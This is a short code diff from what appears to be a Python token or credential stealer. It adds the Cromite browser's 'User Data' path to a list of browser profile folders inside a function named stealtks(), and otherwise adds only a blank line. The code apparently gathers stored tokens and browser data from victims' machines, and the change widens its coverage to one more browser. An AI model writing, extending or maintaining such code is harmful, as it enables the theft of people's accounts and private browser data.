@@ -270,6 +270,7 @@ def stealtks():
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
+    '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
     '0Hola': os.path.join(appdata, 'Hola', 'chromium_profile'),
     '0Iridium': os.path.join(local, "Iridium", "User Data"),
     '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
@@ -399,6 +400,7 @@ def main():
         
 
 main()
+
 
 
 
